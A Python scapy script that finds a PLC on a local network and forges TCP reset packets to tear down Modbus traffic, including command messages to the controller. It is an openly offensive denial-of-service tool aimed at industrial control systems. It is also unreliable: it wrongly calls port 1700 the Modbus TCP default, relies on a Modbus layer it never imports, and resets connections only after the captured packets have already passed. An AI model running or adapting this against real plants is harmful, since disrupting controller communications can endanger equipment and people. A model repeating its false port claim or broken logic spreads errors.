from scapy.all import *
import socket
import time

# Define the IP address of the PLC
plc_ip = None

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 1700))  # 1700 is the default port for Modbus TCP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to block Modbus TCP packets
def block_modbus_packets():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Define the filter to capture Modbus TCP packets
        filter = "tcp and port 1700"
        
        # Start capturing packets
        print("Capturing packets...")
        packets = sniff(filter=filter, count=100)
        
        # Block the packets
        for packet in packets:
            if packet.haslayer(TCP) and packet.getlayer(TCP).dport == 1700:
                # Block the packet by sending a TCP RST packet
                print("Blocking packet...")
                reset_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="R")
                send(reset_packet, verbose=0)
    else:
        print("PLC IP address not found")

# Function to block command messages
def block_command_messages():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Define the filter to capture command messages
        filter = "tcp and port 1700"
        
        # Start capturing packets
        print("Capturing packets...")
        packets = sniff(filter=filter, count=100)
        
        # Block the command messages
        for packet in packets:
            if packet.haslayer(TCP) and packet.getlayer(TCP).dport == 1700:
                # Check if the packet is a command message
                if packet.haslayer(ModbusTCP):
                    print("Blocking command message...")
                    # Block the packet by sending a TCP RST packet
                    reset_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="R")
                    send(reset_packet, verbose=0)
    else:
        print("PLC IP address not found")

# Main function to start the packet blocking
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Block Modbus TCP packets
        block_modbus_packets()
        
        # Block command messages
        block_command_messages()
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()